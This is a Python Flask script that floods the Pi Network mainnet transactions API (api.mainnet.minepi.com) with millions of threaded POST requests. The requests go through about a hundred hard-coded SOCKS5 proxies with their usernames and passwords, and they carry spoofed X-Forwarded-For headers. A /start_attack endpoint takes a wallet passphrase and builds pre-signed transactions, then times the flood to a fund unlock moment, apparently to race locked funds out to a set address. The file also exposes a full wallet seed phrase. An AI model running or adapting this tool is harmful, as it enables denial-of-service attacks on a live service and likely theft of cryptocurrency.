# -*- coding: utf-8 -*-
import random
import socket
import sys
import os
import ssl
import threading
import time
import socks
from fake_useragent import UserAgent
import ipaddress
import itertools
import json
import resource
import argparse
import signal
import sys
from flask import Flask, request, jsonify
from threading import Event
import pytz
from datetime import datetime
from gen_tx1 import XDRGenerator, CHANNEL_PASSPHRASES
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Global flag to stop all threads
stop_event = Event()
start_time = None
duration = None
global xdr_pool
xdr_pool = None
stop_attack = False


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print(f'\n[!] Interrupted by user. Stopping all threads...')
    stop_event.set()
    sys.exit(0)

def duration_monitor(duration):
    """Monitor duration in a separate thread"""
    i = 0
    while i < duration:
        if i == duration:
            stop_event.set()
            break
        time.sleep(1)
        i += 1

    #if i >= duration:
    #    print(f'\n[!] Duration of {duration} seconds reached. Stopping...')
    #    import os
    #    os.kill(os.getpid(), signal.SIGINT)


#sys.stdout.write("\nConfiguring kernel parameters...")
#sys.stdout.flush()
#os.system("sysctl -w net.ipv4.ip_local_port_range='1024 65535'")
#os.system("sysctl -w net.ipv4.tcp_fin_timeout=30")
resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
#sys.path.append('/root/flooding/flood_env/lib/python3.11/site-packages')

ua = UserAgent()
ip_pool = [str(ip) for ip in ipaddress.IPv4Network('192.168.0.0/16')]
threading.stack_size(65444)  # Reduce stack size to 128KB
port = 443
num_requests = 100000000
# Add proxy list from GET version
PROXIES = [
    {'ip': '64.137.65.44', 'port': 6723, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.23.213.184', 'port': 7024, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.27.246.124', 'port': 7448, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '216.74.114.187', 'port': 6470, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '31.59.15.253', 'port': 6520, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.127.248.98', 'port': 5099, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '216.173.105.88', 'port': 5945, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '145.223.57.138', 'port': 6171, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '91.211.87.115', 'port': 7105, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.143.229.247', 'port': 6175, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '86.38.26.174', 'port': 6339, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.92.77.89', 'port': 6111, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '46.203.59.250', 'port': 7374, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.29.249.238', 'port': 8075, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '166.88.238.191', 'port': 6171, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.127.55', 'port': 7020, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.95.250.198', 'port': 6471, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.233.12.116', 'port': 6667, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.42.41', 'port': 6066, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.151.226', 'port': 5719, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '89.249.193.132', 'port': 5870, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.254.225', 'port': 6203, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '194.38.18.38', 'port': 7100, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.24.247.94', 'port': 6928, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '91.211.87.193', 'port': 7183, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.232.209.253', 'port': 6211, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.127.250.139', 'port': 5748, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.0.51', 'port': 5752, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.252.92.153', 'port': 6087, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '206.206.118.228', 'port': 6466, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.167.164', 'port': 6346, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '138.128.148.25', 'port': 6585, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '155.254.38.22', 'port': 5698, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.29.230.120', 'port': 6961, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '198.37.121.50', 'port': 6470, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.24.247.26', 'port': 6860, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.179.251', 'port': 6310, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.30.250.101', 'port': 5613, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '46.203.63.217', 'port': 7242, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.168.118.198', 'port': 6154, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '192.198.126.31', 'port': 7074, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '176.113.66.89', 'port': 5770, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '191.96.69.23', 'port': 5536, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.210.43', 'port': 6413, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.203.42.135', 'port': 5924, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '192.95.91.86', 'port': 5713, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '38.170.188.214', 'port': 5787, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.151.161.37', 'port': 6128, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '84.33.224.140', 'port': 6164, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.13.142', 'port': 6771, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '107.173.93.177', 'port': 6131, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.233.20.151', 'port': 6167, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.144.58', 'port': 5554, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.25.215.51', 'port': 5402, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.93.51', 'port': 7300, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '92.113.119.117', 'port': 6065, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '136.0.182.117', 'port': 6187, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '140.99.199.216', 'port': 6594, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.111.48.209', 'port': 6986, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '184.174.27.35', 'port': 6258, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.138.73', 'port': 6174, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '46.203.202.8', 'port': 5954, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '216.173.72.181', 'port': 6800, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.23.235.55', 'port': 5379, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.232.209.190', 'port': 6148, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '107.172.163.77', 'port': 6593, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.253.45', 'port': 5720, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.253.183', 'port': 5858, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.26.71.221', 'port': 5704, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '38.153.140.33', 'port': 8911, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.236.170.189', 'port': 9222, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.38.107.70', 'port': 5987, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.19.60', 'port': 6737, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '37.44.218.157', 'port': 5840, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.39.50.55', 'port': 6473, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.65.151', 'port': 6665, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.39.25.34', 'port': 5469, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '91.223.126.186', 'port': 6798, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '146.103.4.181', 'port': 6728, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.138.207', 'port': 6308, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '31.58.30.18', 'port': 6600, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.64.70', 'port': 6328, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.23.215.112', 'port': 7439, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.147.240.71', 'port': 6593, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '146.103.4.168', 'port': 6715, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.26.71.222', 'port': 5705, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '64.137.77.67', 'port': 5502, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '146.103.1.46', 'port': 5579, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.85.100.67', 'port': 5108, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '185.15.178.68', 'port': 5752, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '193.148.92.25', 'port': 5952, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '64.137.71.167', 'port': 5985, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '92.112.236.118', 'port': 6550, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.85.100.96', 'port': 5137, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '81.21.233.168', 'port': 5874, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '85.198.41.140', 'port': 6066, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '89.249.195.39', 'port': 6794, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.252.71.187', 'port': 6115, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.254.108', 'port': 6086, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.151.125', 'port': 5618, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'}
]

# Global flag for response display
response_printed = False

# Parse inputs (keep original)
host = ""
ip = ""
port = 443
num_requests = 0

#if len(sys.argv) == 2:
#    port = 80
#    num_requests = 100000000
#elif len(sys.argv) == 3:
#    port = int(sys.argv[2])
#    num_requests = 100000000
#elif len(sys.argv) == 4:
#    port = int(sys.argv[2])
#    num_requests = int(sys.argv[3])
#else:
#    print(f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
#    sys.exit(1)

# Convert FQDN to IP (keep original)
try:
    host = str("api.mainnet.minepi.com").replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print(" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Shared variables (keep original)
thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

#with open("xdr_batch.json") as f:
#    xdr_data = json.load(f)
#    xdr_pool = itertools.cycle(xdr_data['xdrs'])

def attack():
    global response_printed
    print_status()
    current_xdr = next(xdr_pool)
    data = f"tx={current_xdr}"
    #print(f"current xdr is {data}") 
    headers = [
        f"X-Forwarded-For: {random.choice(ip_pool)}",
        f"User-Agent: {ua.random}",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: close",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(data)}"
    ]

    # Setup proxy
    proxy = random.choice(PROXIES)
    dos = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    #print(f"proxy is {proxy} and dos is {dos}")
    try:
        #print(f"[DEBUG] Setting up proxy {proxy['ip']}:{proxy['port']}")
        dos.set_proxy(socks.SOCKS5,
                      proxy['ip'],
                      proxy['port'],
                      username=proxy['user'],
                      password=proxy['pass'])
        
        dos.settimeout(10)
        #print(f"[DEBUG] Connecting to {host}:{port} through proxy")
        
        # Connect through proxy
        dos.connect((host, port))
        #print(f"[DEBUG] Connected successfully")
        
        # Handle SSL
        if port == 443:
            #print(f"[DEBUG] Wrapping with SSL")
            context = ssl.create_default_context()
            ssock = context.wrap_socket(dos, server_hostname=host)
            #print(f"[DEBUG] SSL handshake completed")
        else:
            ssock = dos
        
        # Build request
        request = (
            f"POST /transactions HTTP/1.1\r\n" +
            f"Host: {host}\r\n" +
            "\r\n".join(headers) +
            "\r\n\r\n" +
            data
        ).encode()

        ssock.sendall(request)
        #print(f"[DEBUG] Request sent")

        response = b''
        while True:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            response += chunk
        print(response.decode())
    except socks.ProxyConnectionError as proxy_error:
        print(f"[PROXY ERROR] {proxy['ip']}:{proxy['port']} - {proxy_error}")
    except ssl.SSLError as ssl_error:
        print(f"[SSL ERROR] {proxy['ip']}:{proxy['port']} - {ssl_error}")
    except socket.timeout:
        print(f"[TIMEOUT] {proxy['ip']}:{proxy['port']}")
    except Exception as e:
        print(f"[ERROR] {proxy['ip']}:{proxy['port']} - {type(e).__name__}: {str(e)}")
    finally:
        # Clean up
        try:
            if port == 443 and 'ssock' in locals():
                ssock.close()
            if 'dos' in locals():
                dos.close()
        except:
            pass

print(f"[#] Attack started on {host} ({ip}) || Port: {port} || # Requests: {num_requests}")

# Thread management (keep original)
def main(duration, delay):
        print("NOW RUNNING THE FLOODING SCRIPT")
        global stop_attack
        if delay > 0:
                print(f"⏳ Delay started: {delay:.2f}s remaining")
                start_time = time.time()
                while (remaining := delay - (time.time() - start_time)) > 0:
                    time.sleep(min(1, remaining))
                print("✅ Delay completed")

        print("🔁 Accessing XDR pool")
        with open("xdr_batch.json") as f:
            xdr_data = json.load(f)
            global xdr_pool
            xdr_pool = itertools.cycle(xdr_data['xdrs'])

        #if duration:
        #    duration_thread = threading.Thread(target=duration_monitor, args=(duration,), daemon=True)
        #    duration_thread.start()

        timer = threading.Timer(duration, lambda: globals().update(stop_attack=True))
        timer.start()


        print("🚀 Starting attack threads")
        all_threads = []
        for i in range(10000000):
            if stop_attack:  # Add this check
                break
            t1 = threading.Thread(target=attack)
            t1.start()
            all_threads.append(t1)
            time.sleep(0.0001)

        for current_thread in all_threads:
            current_thread.join()


def get_unix_and_delay(target_time_str, buffer_seconds=0):
    """
    Convert WAT time to Unix timestamp with server timezone conversion
    Returns (unix_timestamp, delay) or (None, None) on error
    """
    try:
        # Define timezones
        wat_tz = pytz.timezone('Africa/Lagos')
        server_tz = pytz.timezone('America/Los_Angeles')  # California server

        # Get current time in WAT
        now_wat = datetime.now(wat_tz)

        # Parse input time
        naive_time = datetime.strptime(target_time_str, "%H:%M:%S")

        # Create target datetime in WAT
        target_wat = wat_tz.localize(
            naive_time.replace(
                year=now_wat.year,
                month=now_wat.month,
                day=now_wat.day
            )
        )

        # Handle next day if time already passed today
        if target_wat < now_wat:
            target_wat += timedelta(days=1)

        # Convert to server timezone
        server_time = target_wat.astimezone(server_tz)

        # Apply buffer and convert to UTC
        target_utc = server_time.astimezone(pytz.utc)

        # Check if target is in past
        now_utc = datetime.now(pytz.utc)
        if target_utc < now_utc:
            print("Target time is in the past!")
            return None, None

        # Calculate final values
        unix_timestamp = int(target_utc.timestamp())
        delay = (target_utc - now_utc).total_seconds()

        return unix_timestamp, delay

    except ValueError as e:
        print(f"Invalid time format: {str(e)}")
        return None, None
    except Exception as e:
        print(f"Time conversion failed: {str(e)}")
        return None, None


@app.route('/start_attack', methods=['POST'])
def start_attack():
    import multiprocessing
    try:
        # Get parameters from request
        data = request.get_json()
        
        # Extract parameters from JSON
        base_passphrase = data.get('base_passphrase')
        dest_address = data.get('dest_address')
        amount = data.get('amount')
        unlock_time = data.get('unlock_time')

        print(f"base phrase is {base_passphrase} and delay is {unlock_time}")
        duration = 10
        # Convert unlock time to timestamp
        #unlock_ts = datetime.strptime(unlock_time, "%Y-%m-%d %H:%M:%S").timestamp()
        #unix_ts, delay = get_unix_and_delay(unlock_time)
        #print("delay is ", delay)
        generator = XDRGenerator(
            base_passphrase=base_passphrase,
            dest_address=dest_address,
            withdrawal_amount=amount
            )
        # Generate XDR batch with 1 hour validity
        generator.generate_xdr_batch(
            channel_passphrases=CHANNEL_PASSPHRASES,
            unlock_time=int(time.time()) + 6000
            )

        unix_ts, new_delay = get_unix_and_delay(unlock_time)
        print("new_delay is ", new_delay - 10)
        my_delay = new_delay - 15
        #main(duration, my_delay)
        # Start attack in background thread
        #thread = threading.Thread(
        #    target=main,
        #    args=(duration, my_delay)
        #)
        #thread.start()
        process = multiprocessing.Process(
            target=main,
            args=(duration, my_delay)
        )
        process.start()
        return jsonify({
            "status": "Attack started",
            "unlock_time": unlock_time,
            "estimated_duration": 60
        }), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 400


if __name__ == "__main__":
    import random
    import socket
    import sys
    import os
    import ssl
    import threading
    import time
    import socks
    from fake_useragent import UserAgent
    import ipaddress
    import itertools
    import json
    import resource
    import pytz
    from datetime import datetime
    from gen_tx1 import XDRGenerator, CHANNEL_PASSPHRASES
    #print("NOW RUNNING THE FLOODING SCRIPT")
    #port = 443
    #num_requests = 100000000
    #duration = 20

    #target_time = "20:42:52"


    base_passphrase = "canyon inmate repeat hawk coast flock base real beef interest list famous feed draft lucky bottom address dose despair sword enter possible park before"
    dest_address = "GCI666CGWE4TKFDGEKGC3ELS64HY37XOPMGWYCKEITVROZDBCLIL4O4I"
    amount= "1"
    app.run(host='0.0.0.0', port=5000, debug=False)
    # Initialize generator
    #generator = XDRGenerator(
            #base_passphrase=base_passphrase,
        #dest_address=dest_address,
        #withdrawal_amount=amount
        #)
    # Generate XDR batch with 1 hour validity
    #generator.generate_xdr_batch(
            #channel_passphrases=CHANNEL_PASSPHRASES,
        #unlock_time=int(time.time()) + 6000
        #)
    

    #unix_ts, delay = get_unix_and_delay(target_time)
    #print(f"delay is {delay}")
    #new_d = delay - 20
    #main(duration, new_d)
